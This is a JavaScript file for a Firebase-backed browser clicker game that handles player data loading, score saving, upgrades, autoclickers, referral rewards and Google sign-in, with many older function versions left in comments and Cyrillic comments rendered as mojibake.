/*!!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null;
      user.referral_bonus_claimed = data.referral_bonus_claimed || false;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –±—É—Å—Ç–∞
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          db.ref(`leaderboard/${uid}/score`).transaction(currentScore => {
            score = (currentScore || 0) + tokensEarned;
            return score;
          }).then(() => {
            showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            updateTaskProgress("collectTokens", tokensEarned);
            updateTaskProgress("collectBigTokens", tokensEarned);
            updateCounterDisplay();
          });
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false);
      } else if (autoclickActive) {
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
     // startBonusTimer();
    }

    db.ref("leaderboard/" + uid).update({
      lastUpdate: Date.now()
    });
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!!*/ //rabochiy



function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      crystals = data.crystals || 0; // Load crystals
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null;
      user.referral_bonus_claimed = data.referral_bonus_claimed || false;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –±—É—Å—Ç–∞
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`Boost ended: Click Power restored`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          db.ref(`leaderboard/${uid}/score`).transaction(currentScore => {
            score = (currentScore || 0) + tokensEarned;
            return score;
          }).then(() => {
            showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            updateTaskProgress("collectTokens", tokensEarned);
            updateTaskProgress("collectBigTokens", tokensEarned);
            updateCounterDisplay();
          });
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false);
      } else if (autoclickActive) {
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
      startBonusTimer();
      checkWeeklyReset(); // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–±—Ä–æ—Å –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω–æ–π —Ç–∞–±–ª–∏—Ü—ã
      if (score >= 50000) updateWeeklyScore(); // –û–±–Ω–æ–≤–ª—è–µ–º –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω—ã–π —Å—á–µ—Ç
    }

    db.ref("leaderboard/" + uid).update({
      lastUpdate: Date.now()
    });
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}
  
  
              

 /*!!!!   function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ä–µ—Ñ–µ—Ä–µ—Ä
    if (user.referrer_uid) {
      // –û–±–Ω–æ–≤–ª—è–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à—ë–Ω–Ω—ã–º
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∏–≥ –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1000 —Ç–æ–∫–µ–Ω–æ–≤
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              // –ù–∞—á–∏—Å–ª—è–µ–º 1000 —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–µ–º—É
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                console.log(`Referral reward of 1000 tokens credited to inviter: ${user.referrer_uid}`);

                // –°–æ–∑–¥–∞—ë–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –¥–ª—è –ø—Ä–∏–≥–ª–∞—à–∞—é—â–µ–≥–æ
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                }).then(() => {
                  console.log(`Notification created for inviter: ${user.referrer_uid}`);
                }).catch(error => {
                  console.error('Error creating notification for inviter:', error);
                });

              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              // –ù–∞—á–∏—Å–ª—è–µ–º 1000 —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à—ë–Ω–Ω–æ–º—É
              score += 1000;
              showMessage('Milestone reward: +1000 tokens!');
              db.ref(`leaderboard/${user.uid}/score`).set(score).then(() => {
                console.log(`Milestone reward of 1000 tokens credited to invited: ${user.uid}`);
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              // –û—Ç–º–µ—á–∞–µ–º –Ω–∞–≥—Ä–∞–¥—É –∫–∞–∫ –ø–æ–ª—É—á–µ–Ω–Ω—É—é
              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              }).then(() => {
                console.log('Reward marked as claimed for:', user.uid);
              }).catch(error => {
                console.error('Error marking reward as claimed:', error);
              });

              // –õ–æ–≥–∏—Ä—É–µ–º –Ω–∞—á–∏—Å–ª–µ–Ω–∏–µ –Ω–∞–≥—Ä–∞–¥—ã
              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            } else if (refData && refData.reward_claimed) {
              console.log('Reward already claimed for:', user.uid);
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error saving score:', error);
    showMessage('Failed to save progress.');
  });
} !!!!*/ //clickToken         




 /*!  function submitScore() {
  if (!user) {
    console.log('User not authenticated, cannot submit score.');
    return;
  }

  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;

  // –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ, –Ω–æ score —É–∂–µ –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ –¥—Ä—É–≥–∏—Ö –º–µ—Å—Ç–∞—Ö
  db.ref("leaderboard/" + user.uid).update({
    id: user.uid,
    name: userName,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    console.log(`Leaderboard updated for ${user.uid}`);
    // –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –æ—Å—Ç–∞—ë—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
    if (user.referrer_uid) {
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                });
              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
                score = (currentScore || 0) + 1000;
                return score;
              }).then(() => {
                showMessage('Milestone reward: +1000 tokens!');
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              });

              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error updating leaderboard:', error);
    showMessage('Failed to save progress.');
  });
}!*/ //rabochiy


function submitScore() {
  if (!user) {
    console.log('User not authenticated, cannot submit score.');
    return;
  }

  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;

  // –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –æ–±—â–µ–π —Ç–∞–±–ª–∏—Ü–µ –ª–∏–¥–µ—Ä–æ–≤
  db.ref("leaderboard/" + user.uid).update({
    id: user.uid,
    name: userName,
    score: score, // –Ø–≤–Ω–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º score
    crystals: crystals, // Save crystals
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    console.log(`Leaderboard updated for ${user.uid}`);
    // –û–±–Ω–æ–≤–ª—è–µ–º –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω—ã–π —Å—á–µ—Ç
    if (score >= 50000) {
      updateWeeklyScore();
    }
    // –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞
    if (user.referrer_uid) {
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refSnapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                db.ref(`notifications/${user.referrer_uid}`).push({
                  message: 'Referral reward: +1000 tokens!',
                  timestamp: Date.now(),
                  read: false
                });
              }).catch(error => {
                console.error('Error crediting inviter:', error);
              });

              db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
                score = (currentScore || 0) + 1000;
                return score;
              }).then(() => {
                showMessage('Milestone reward: +1000 tokens!');
                updateCounterDisplay();
              }).catch(error => {
                console.error('Error crediting invited:', error);
              });

              db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                reward_claimed: true,
                lastUpdate: Date.now()
              });

              db.ref('referral_logs').push({
                inviter_uid: user.referrer_uid,
                invited_uid: user.uid,
                timestamp: Date.now(),
                action: 'reward_claimed',
                inviter_reward: 1000,
                invited_reward: 1000
              });
            }
          }).catch(error => {
            console.error('Error checking referral data:', error);
          });
        }
      }).catch(error => {
        console.error('Error updating referral tokens earned:', error);
      });
    }
  }).catch(error => {
    console.error('Error updating leaderboard:', error);
    showMessage('Failed to save progress.');
  });
}

  
  
  

   /*! function submitScore() {
      if (!user) return;
      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
      db.ref("leaderboard/" + user.uid).set({
        id: user.uid,
        name: userName,
        score: score,
        clickPower: clickPower,
        autoclickActive: autoclickActive,
        autoclickEndTime: autoclickEndTime,
        tempBoostActive: !!tempBoostTimeout,
        tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
        tempBoostOriginalClickPower: originalClickPower || clickPower,
        tempBoostAmount: clickPower - (originalClickPower || clickPower),
        lastUpdate: Date.now()



        
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
      });
    }!*/



 /*!!  function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? (Date.now() + (tempBoostEndTime || 0)) : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
  });
}!!*/

    

  /*!  function buyUpgrade(type) {
      const cost = getClickPowerUpgradeCost();
      if (type === "clickPower") {
        if (clickPower >= 8) {
          showMessage("Click Power is at maximum!");
          return;
        }

        const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
        if (clickPower >= 3 && currentLevel < clickPower + 1) {
          showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
          const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
          buyButton.style.animation = "shake 0.3s";
          setTimeout(() => buyButton.style.animation = "", 300);
          return;
        }

        if (score >= cost) {
          score -= cost;
          clickPower++;
          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          updateClickPowerCostText();
          submitScore();
          showMessage("Click Power upgraded!");
        } else {
          showMessage("Not enough tokens for upgrade.");
        }
      }
    }!*/


    function buyUpgrade(type) {
  if (type === "clickPower") {
    if (clickPower >= 8) {
      showMessage("Click Power is at maximum!");
      return;
    }

    const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
    if (clickPower >= 3 && currentLevel < clickPower + 1) {
      showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
      buyButton.style.animation = "shake 0.3s";
      setTimeout(() => buyButton.style.animation = "", 300);
      return;
    }

    const cost = getClickPowerUpgradeCost();

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏ –æ–±–Ω–æ–≤–ª—è–µ–º score —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
    db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
      const newScore = (currentScore || 0) - cost;
      if (newScore < 0) {
        // –û—Ç–º–µ–Ω—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é, –µ—Å–ª–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤
        return undefined;
      }
      return newScore;
    }).then(transactionResult => {
      if (transactionResult.committed) {
        // –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–∞
        score = transactionResult.snapshot.val();
        clickPower++;
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
        updateClickPowerCostText();
        submitScore();
        showMessage("Click Power upgraded!");
      } else {
        showMessage("Not enough tokens for upgrade.");
      }
    }).catch(error => {
      console.error("Error during upgrade transaction:", error);
      showMessage("Failed to upgrade Click Power.");
    });
  }
}

  

function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    const duration = minutes * 60000;
    startAutoclicker(duration, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –∑–∞–º–µ–Ω—ã –≤—Ä–µ–º–µ–Ω–∏
    updateTaskProgress("autoclickerMaster", 1);

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker purchase:", error);
      });
    }

    updateProfilePanel();
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
    
//noviy autocliker
function updateAutoclickerShop() {
  const levelDisplay = document.getElementById("autoclickerLevel");
  const durationDisplay = document.getElementById("autoclickerDurationValue");
  const upgradeCostDisplay = document.getElementById("autoclickerUpgradeCost");
  const upgradeBtn = document.getElementById("upgradeAutoclickerBtn");
  const freeAutoclickerBtn = document.getElementById("activateFreeAutoclickerBtn");

  levelDisplay.innerText = autoclickerLevel;
  const durationSeconds = Math.floor(getAutoclickerDuration() / 1000);
  durationDisplay.innerText = durationSeconds >= 3600 
    ? `${Math.floor(durationSeconds / 3600)}h ${Math.floor((durationSeconds % 3600) / 60)}m`
    : durationSeconds >= 60 
      ? `${Math.floor(durationSeconds / 60)}m ${durationSeconds % 60}s`
      : `${durationSeconds}s`;

  if (autoclickerLevel >= 20) {
    upgradeCostDisplay.innerText = "Autoclicker: MAX LEVEL";
    upgradeBtn.disabled = true;
  } else if (autoclickerLevel >= Math.min(currentLevel, 4)) {
    upgradeCostDisplay.innerText = `Need Player Level ${autoclickerLevel + 1}`;
    upgradeBtn.disabled = true;
  } else {
    const cost = getAutoclickerUpgradeCost();
    upgradeCostDisplay.innerText = `Upgrade Cost: ${cost.tokens} Tokens + ${cost.crystals} üíé`;
    upgradeBtn.disabled = false;
  }

  freeAutoclickerBtn.disabled = autoclickActive;
}


//noviy autoclicker    
function activateFreeAutoclicker() {
  if (autoclickActive) {
    showMessage("Autoclicker is already active!");
    return;
  }

  const duration = getAutoclickerDuration();
  startAutoclicker(duration);
  autoclickerUses++;
  updateTaskProgress("autoclickerMaster", 1);
  checkAchievements();
  const durationSeconds = Math.floor(duration / 1000);
  const durationText = durationSeconds >= 3600 
    ? `${Math.floor(durationSeconds / 3600)}h ${Math.floor((durationSeconds % 3600) / 60)}m`
    : durationSeconds >= 60 
      ? `${Math.floor(durationSeconds / 60)}m ${durationSeconds % 60}s`
      : `${durationSeconds}s`;
  showMessage(`Free autoclicker activated for ${durationText}!`);
  updateAutoclickerShop();
  submitScore();
}



 //noviy autoclicker   
 function getAutoclickerDuration() {
  const baseDuration = 60 * 1000; // 1 –º–∏–Ω—É—Ç–∞
  const durationPerLevel = (maxAutoclickerDuration - baseDuration) / 19;
  return Math.floor(baseDuration + (autoclickerLevel - 1) * durationPerLevel);
 }   
    

    
   function signInWithGoogle() {
      const provider = new firebase.auth.GoogleAuthProvider();
      auth.signInWithPopup(provider).then(result => {
        user = result.user;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        loadNotifications(user.uid); // –ó–∞–≥—Ä—É–∂–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
        submitScore();
      }).catch(error => {
        showMessage("Google sign-in failed.");
        console.error(error);
      });
    }

  /*!!  function signInWithGoogle() {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider).then(result => {
    user = result.user;
    document.getElementById('authSection').style.display = 'none';
    document.getElementById('gameSection').style.display = 'block';
    loadPlayerData(user.uid);
    submitScore();
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞ –∏–∑ URL
    const urlParams = new URLSearchParams(window.location.search);
    const referrerUid = urlParams.get('ref');
    if (referrerUid) {
      saveReferrer(referrerUid);
    }
  }).catch(error => {
    showMessage('Google sign-in failed.');
    console.error(error);
  });
    }!!*/
    

/*!    function signOut() {
      if (user) {
        submitScore();
      }

      auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
      });
    }!*/

 /*!!   function signOut() {
    if (user) {
        submitScore().then(() => {
            auth.signOut().then(() => {
                user = null;
                score = 0;
                clickPower = 1; // –õ–æ–∫–∞–ª—å–Ω—ã–π —Å–±—Ä–æ—Å, –Ω–æ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ –±–∞–∑–µ
                autoclickEndTime = 0;
                clearInterval(autoclickInterval);
                document.getElementById("authSection").style.display = "block";
                document.getElementById("gameSection").style.display = "none";
                updateCounterDisplay();
                updateClickPowerBar();
                updateProfilePanel();
                showMessage("–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.");
            }).catch(error => {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞:", error);
                showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–π—Ç–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.");
            });
        }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–µ—Ä–µ–¥ –≤—ã—Ö–æ–¥–æ–º:", error);
            showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å –ø–µ—Ä–µ–¥ –≤—ã—Ö–æ–¥–æ–º.");
        });
    } else {
        auth.signOut().then(() => {
            user = null;
            score = 0;
            clickPower = 1;
            autoclickEndTime = 0;
            clearInterval(autoclickInterval);
            document.getElementById("authSection").style.display = "block";
            document.getElementById("gameSection").style.display = "none";
            updateCounterDisplay();
            updateClickPowerBar();
            updateProfilePanel();
            showMessage("–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.");
        });
    }
}!!*/

function signOut() {
    console.log("signOut –≤—ã–∑–≤–∞–Ω–∞, user:", user);
    auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
        showMessage("–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.");
    }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–π—Ç–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.");
    });
}


  /*!  auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        checkDailyReward();
        renderTasks();
      }
    });!*/

